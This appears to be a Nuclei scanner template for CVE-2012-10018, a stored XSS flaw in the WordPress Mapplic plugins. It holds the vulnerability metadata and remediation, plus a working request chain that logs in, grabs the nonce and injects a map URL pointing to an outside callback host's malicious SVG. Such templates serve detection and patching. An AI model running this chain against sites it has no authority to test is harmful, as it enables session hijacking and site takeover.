id: CVE-2012-10018

info:
  name: WordPress Mapplic <= 6.1 / Mapplic Lite <= 1.0 - Authenticated Stored XSS via SVG File Upload
  author: KrE80r
  severity: high
  description: |
    The Mapplic and Mapplic Lite plugins for WordPress are vulnerable to Stored Cross-Site Scripting via arbitrary remote file URL injection in versions up to and including 6.1 and 1.0 respectively. This allows authenticated users with author-level permissions to inject arbitrary remote URLs for map files via the raw JSON editor. When an attacker provides a URL to a malicious SVG file containing JavaScript, the plugin fetches the SVG via SSRF and renders it unsafely in the admin panel, resulting in Stored XSS.
  impact: |
    An attacker with author-level access can inject malicious SVG files containing JavaScript payloads. When administrators edit the map in the admin panel, the malicious scripts execute, potentially leading to session hijacking, privilege escalation, or complete site compromise.
  remediation: |
    Update Mapplic to version 7.0 or later, and Mapplic Lite to version 1.0.1 or later.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2012-10018
    - https://wpscan.com/vulnerability/7bdee32b-9036-4e13-9586-4d6a9a1159c6/
    - https://patchstack.com/database/wordpress/plugin/mapplic-lite/vulnerability/wordpress-mapplic-lite-plugin-1-0-stored-cross-site-scripting-xss-injection-via-server-side-request-forgery-ssrf-vulnerability
    - https://packetstormsecurity.com/files/161920/WordPress-Mapplic-6.1-SSRF-Cross-Site-Scripting.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cve-id: CVE-2012-10018
    cwe-id: CWE-79
    epss-score: 0.00045
    epss-percentile: 0.17483
    cpe: cpe:2.3:a:mapplic:mapplic:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: mapplic
    product: mapplic
  tags: cve,cve2012,wordpress,wp-plugin,xss,mapplic,authenticated

variables:
  map_id: "{{rand_text_alpha(8)}}"

http:
  - raw:
      - |
        POST /wp-login.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
      - |
        GET /wp-admin/post-new.php?post_type=mapplic_map HTTP/1.1
        Host: {{Hostname}}
      - |
        POST /wp-admin/post.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        _wpnonce={{nonce}}&post_ID={{post_id}}&mapplic-mapdata=%7B%22mapwidth%22%3A%22100%22%2C%22mapheight%22%3A%22100%22%2C%22minimap%22%3Afalse%2C%22clearbutton%22%3Atrue%2C%22zoombuttons%22%3Atrue%2C%22sidebar%22%3Afalse%2C%22search%22%3Afalse%2C%22hovertip%22%3Atrue%2C%22mousewheel%22%3Atrue%2C%22fullscreen%22%3Afalse%2C%22deeplinking%22%3Atrue%2C%22mapfill%22%3Afalse%2C%22zoom%22%3Atrue%2C%22alphabetic%22%3Afalse%2C%22zoomlimit%22%3A%223%22%2C%22action%22%3A%22tooltip%22%2C%22categories%22%3A%5B%5D%2C%22levels%22%3A%5B%7B%22id%22%3A%22{{map_id}}%22%2C%22title%22%3A%22Test%22%2C%22map%22%3A%22{{interactsh-url}}%2Fxss.svg%22%2C%22minimap%22%3A%22%22%2C%22locations%22%3A%5B%5D%7D%5D%7D&action=editpost&post_type=mapplic_map
      - |
        GET /wp-admin/post.php?post={{post_id}}&action=edit HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: regex
        part: body
        regex:
          - 'data-mapdata=.*https?://[a-z0-9]+\.oast\.(pro|live|site|me|fun)/xss\.svg'
        condition: and

      - type: word
        part: body
        words:
          - 'mapplic-admin-map'
          - 'mapplic-rawedit'
        condition: and

    extractors:
      - type: regex
        name: nonce
        part: body
        group: 1
        regex:
          - 'name="_wpnonce" value="([a-f0-9]+)"'
        internal: true

      - type: regex
        name: post_id
        part: body
        group: 1
        regex:
          - 'name=.post_ID. value=.(\d+).'
        internal: true
